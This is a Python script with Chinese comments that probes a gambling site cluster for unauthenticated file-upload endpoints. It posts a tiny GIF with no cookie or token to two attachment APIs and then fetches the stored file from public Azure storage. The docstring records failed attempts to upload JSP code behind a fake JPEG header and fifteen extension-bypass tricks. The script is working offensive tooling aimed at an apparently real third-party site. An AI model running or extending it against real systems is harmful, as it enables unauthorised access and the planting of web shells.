#!/usr/bin/env python3
"""菠菜站群 prodSite5 未授权文件上传探测 + 落地 Azure Blob 回读验证。
原理：/aocai-api/attachment/upload 与 /attachment/uploadChat 两个附件接口
     **不做任何会话鉴权**（不带 Cookie/token 也返回 result=0），
     文件落地到 Azure Front Door 静态存储，公网可直接回读。
     （对照：/aocai-api/upload、/uploadFile、/file/upload 返回 e00006 需登录）
限制：服务端对内容做**真实图片 Magic 校验**（自造 JPEG 头 + JSP 代码 → 「不是有效的图片文件」），
     且**强制把存储扩展名规范化为 .png**。扩展名绕过（15 种变体）与 blob 白名单均无效。
"""
import json, ssl, urllib.request, urllib.error, uuid

BASE = "https://TARGET"
API = BASE + "/aocai-api/"
CTX = ssl._create_unverified_context()
UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 "
      "(KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1")
GIF = bytes.fromhex(
    "47494638396101000100800000000000ffffff21f90401000000002c000000000100010000"
    "02024401003b")

def mpart(fname, fdata, ftype="image/gif", bname="file", fields=None):
    b = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
    out = b""
    for k, v in (fields or {}).items():
        out += (f"--{b}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n").encode()
    out += (f"--{b}\r\nContent-Disposition: form-data; name=\"{bname}\"; "
            f"filename=\"{fname}\"\r\nContent-Type: {ftype}\r\n\r\n").encode()
    out += fdata + b"\r\n" + f"--{b}--\r\n".encode()
    return out, f"multipart/form-data; boundary={b}"

def probe(ep, fname, data, ctype, fields=None):
    body, ct = mpart(fname, data, ctype, fields=fields)
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
         "Origin": BASE, "Referer": BASE + "/wap/", "X-Requested-With": "XMLHttpRequest",
         "Content-Type": ct}   # 注意：无 Cookie / 无 token
    r = urllib.request.Request(API + ep.lstrip("/"), data=body, method="POST", headers=h)
    with urllib.request.urlopen(r, timeout=30, context=CTX) as resp:
        return resp.status, resp.read().decode("utf-8", "ignore")

if __name__ == "__main__":
    for ep in ["attachment/upload", "attachment/uploadChat"]:
        st, t = probe(ep, "x.png", GIF, "image/gif",
                      fields={"bizType": "1"} if "Chat" not in ep else None)
        print(f"[{ep}] {st} {t}")
        try:
            url = json.loads(t)["data"]["url"]
            with urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": UA}),
                                        timeout=20, context=CTX) as rr:
                print(f"   回读 {rr.status} len={len(rr.read())}  ← 未授权文件已公网可读")
        except Exception as e:
            print(f"   回读失败 {e}")
